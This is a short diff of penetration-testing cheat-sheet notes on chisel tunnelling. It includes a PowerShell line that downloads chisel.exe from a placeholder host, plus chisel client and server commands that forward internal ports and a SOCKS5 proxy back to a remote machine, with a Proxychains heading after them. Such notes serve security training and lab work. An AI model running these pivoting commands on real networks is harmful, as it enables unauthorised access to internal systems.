@@ -1,16 +1,16 @@
 https://github.com/jpillora/chisel/releases
 
-```bash
+```powershell
 Invoke-WebRequest -Uri http://<ip>:8000/chisel.exe -OutFile chisel.exe
 ```
 
 ```bash
-./chisel.exe client <ip>:8080 R:445:localhost:445
-
-chisel client <ip>:8080 R:3000:localhost:3000
-
+# Server
 chisel server --reverse --socks5
-.\chisel.exe server --reverse --socks5
+# Server on Custom Port
+chisel server --reverse --port 9001
+# Client
+chisel client <ip>:8080 R:3000:localhost:3000
 ```
 ## Proxychains
 ```bash
